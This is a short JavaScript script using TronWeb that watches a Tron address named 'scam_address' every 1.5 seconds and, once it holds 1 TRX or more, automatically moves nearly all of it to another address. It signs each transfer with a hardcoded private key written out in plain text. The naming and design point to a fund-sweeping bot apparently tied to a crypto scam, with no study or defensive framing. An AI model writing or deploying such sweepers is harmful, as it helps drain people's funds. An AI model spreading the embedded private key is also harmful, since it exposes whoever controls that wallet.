const TronWeb = require('tronweb')

const scam_address = 'TNa8z9UpTBbVAAVcMJ7WxqYEfEj67niiJN'
const real_private_key = 'd9eae9e65753a9ce3cd2cfcfd4ed3ebc4cddc37d91ec3aebe58b41fa7792a17c'
const send_to = 'TRqR6PPtniayibM2fCojofFxdbwr9JW9Hs'

async function main() {
  try {
    const tronWeb = new TronWeb({
      fullHost: 'https://api.trongrid.io',
    })

    let check_it = setInterval(async function() {
      try {
        let balance = await tronWeb.trx.getBalance(scam_address)
        console.log(`Current balance ${balance}`)
        let sac = true
        if (balance / 1000000 >= 1) {
          const withdraw_amount = balance - 2000000
          console.log(`Withdrawing ${withdraw_amount} TRX`)

          const first_tx = await tronWeb.transactionBuilder.sendTrx(send_to, withdraw_amount, scam_address);
          let signed_tx = await tronWeb.trx.multiSign(first_tx, real_private_key, 0)
          let asd = await tronWeb.trx.sendRawTransaction(signed_tx)
          console.log(asd)
        }
      } catch (err) {
        console.log(err.message)
      }
    }, 1500);
  } catch (err) {
    console.log(err)
  }
}

main()
